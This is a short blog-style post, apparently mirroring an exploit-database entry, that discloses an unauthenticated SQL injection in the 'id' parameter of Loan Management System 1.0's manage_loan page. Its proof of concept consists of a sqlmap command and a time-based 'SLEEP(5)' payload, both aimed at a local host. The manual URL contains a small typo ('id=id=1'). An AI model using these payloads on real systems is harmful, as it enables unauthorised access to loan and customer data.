---
layout: post
title: Loan Management System 1.0 - Unauthenticated SQL injection (manage_loan page)
tags: [CVE]
description: "Loan Management System 1.0 - Unauthenticated SQL injection (manage_loan page)"

---

```
# Exploit Title: Loan Management System 1.0 - Unauthenticated SQL injection (manage_loan page)
# Date: 2020-09-26
# Exploit Author: Thibault Galbourdin (Liodeus)
# Vendor Homepage: https://www.sourcecodester.com/php/14471/loan-management-system-using-phpmysql-source-code.html
# Product Link: https://www.sourcecodester.com/download-code?nid=14471&title=Loan+Management+System+using+PHP%2FMySQL+with+Source+Code
# Tested on: Windows 10 + 7.4.10

# Description:
# An issue was discovered in Loan Management System 1.0. There is an unauthenticated SQL injection,
# on the manage_loan page, the vulnerable parameter is id. This can be exploited to manipulate SQL 
# queries by injecting arbitrary SQL code.

# POC

# SQLMAP
	sqlmap -u "http://127.0.0.1/loan/manage_loan.php?id=1" --dbms=MySQL

# Manual time based
	http://127.0.0.1/manage_loan.php?id=id=1 AND SLEEP(5)
```

